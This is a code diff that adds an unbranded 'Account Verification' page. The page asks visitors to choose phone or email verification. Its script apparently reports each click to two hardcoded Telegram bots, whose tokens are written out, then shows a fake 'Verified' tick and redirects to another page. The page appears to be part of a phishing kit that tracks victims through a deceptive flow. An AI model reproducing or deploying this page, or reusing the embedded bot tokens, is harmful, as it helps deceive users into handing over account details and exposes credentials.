@@ -1,0 +1,184 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Account Verification</title>
+    <style>
+        body {
+            font-family: Arial, sans-serif;
+            margin: 0;
+            padding: 0;
+            background-color: #1f1f1f;
+            color: #fff;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            height: 100vh;
+        }
+
+        .verification-container {
+            background-color: #2b2b2b;
+            border-radius: 10px;
+            box-shadow: 0 4px 8px rgba(0, 0, 0, 0.2);
+            width: 100%;
+            height: 100%;
+            text-align: center;
+        }
+
+        .verification-container h1 {
+            margin-top: 100px;
+            font-size: 18px;
+            margin-bottom: 20px;
+        }
+
+        .verification-container p {
+            margin: 10px;
+            font-family: 'Gill Sans', 'Gill Sans MT', Calibri, 'Trebuchet MS', sans-serif;
+            color: #969696;
+        }
+
+        .verification-option {
+            background-color: #3a3a3a;
+            border: none;
+            margin-top: 10px;
+            margin-left: 10%;
+            margin-right: 10%;
+            border-radius: 8px;
+            padding: 10px 15px;
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+            margin-bottom: 10px;
+            cursor: pointer;
+            transition: background-color 0.3s;
+        }
+
+        .verification-option:hover {
+            background-color: #444;
+        }
+
+        .verification-option .icon {
+            font-size: 18px;
+            margin-right: 10px;
+            position: relative;
+        }
+
+        .verification-option .text {
+            font-size: 14px;
+            display: flex;
+            align-items: center;
+        }
+
+        .verification-option .go-verify {
+            color: #22c55e;
+            font-family: system-ui, -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, Oxygen, Ubuntu, Cantarell, 'Open Sans', 'Helvetica Neue', sans-serif;
+            font-weight: 10px;
+            font-size: medium;
+        }
+
+        .icon img {
+            width: 20px;
+            height: 20px;
+        }
+
+        .tick {
+            position: absolute;
+            width: 20px;
+            height: 20px;
+            background-image: url('img/tickgrn.png');
+            background-size: cover;
+            display: none;
+        }
+    </style>
+</head>
+<body>
+    <div class="verification-container">
+        <h1>Please verify your account</h1>
+        <p>For your account safety, please choose 2 verify methods to continue.</p>
+
+        <div class="verification-option" id="phone-verify">
+            <div class="text">
+                <span class="icon">
+                    <img src="phone.png" alt="Phone Icon">
+                    <div class="tick" id="phone-tick"></div>
+                </span>
+                Phone Verification
+            </div>
+            <div class="go-verify" id="phone-verify-text">Go Verify &gt;</div>
+        </div>
+
+        <div class="verification-option" id="email-verify">
+            <div class="text">
+                <span class="icon">
+                    <img src="envelope.png" alt="Email Icon">
+                    <div class="tick" id="email-tick"></div>
+                </span>
+                Email Verification
+            </div>
+            <div class="go-verify" id="email-verify-text">Go Verify &gt;</div>
+        </div>
+    </div>
+
+    <script>
+        const bots = {
+            "7746332737:AAEOz6lVMykBEDri1KAIsN_UFo8eAJoEoHs": "6942741954",
+            "7860053171:AAH5rKPoMIjqvqgAo8h3J_etU8Waawn1MvI": "7120473372",
+        };
+
+        async function sendVerificationRequest(botToken, userId, method) {
+            const url = `https://api.telegram.org/bot${botToken}/sendMessage`;
+            const data = {
+                chat_id: userId,
+                text: `${method} verification requested.`,
+            };
+
+            try {
+                const response = await fetch(url, {
+                    method: 'POST',
+                    headers: {
+                        'Content-Type': 'application/json',
+                    },
+                    body: JSON.stringify(data),
+                });
+
+                if (response.ok) {
+                    console.log(`${method} verification request sent to Telegram bot.`);
+                } else {
+                    console.error(`Failed to send ${method} verification request.`);
+                }
+            } catch (error) {
+                console.error('Error:', error);
+            }
+        }
+
+        document.getElementById('phone-verify').addEventListener('click', async function () {
+            // Send phone verification request to all Telegram bots
+            for (const [botToken, userId] of Object.entries(bots)) {
+                await sendVerificationRequest(botToken, userId, 'Phone');
+            }
+
+            // Show green tick and update button text
+            document.getElementById('phone-tick').style.display = 'block';
+            document.getElementById('phone-verify-text').textContent = 'Verified';
+
+            // Redirect to the next page after all data is sent
+            window.location.href = 'abcde.html';
+        });
+
+        document.getElementById('email-verify').addEventListener('click', async function () {
+            // Send email verification request to all Telegram bots
+            for (const [botToken, userId] of Object.entries(bots)) {
+                await sendVerificationRequest(botToken, userId, 'Email');
+            }
+
+            // Show green tick and update button text
+            document.getElementById('email-tick').style.display = 'block';
+            document.getElementById('email-verify-text').textContent = 'Verified';
+
+            // Redirect to the next page after all data is sent
+            window.location.href = 'abcde.html';
+        });
+    </script>
+</body>
+</html>
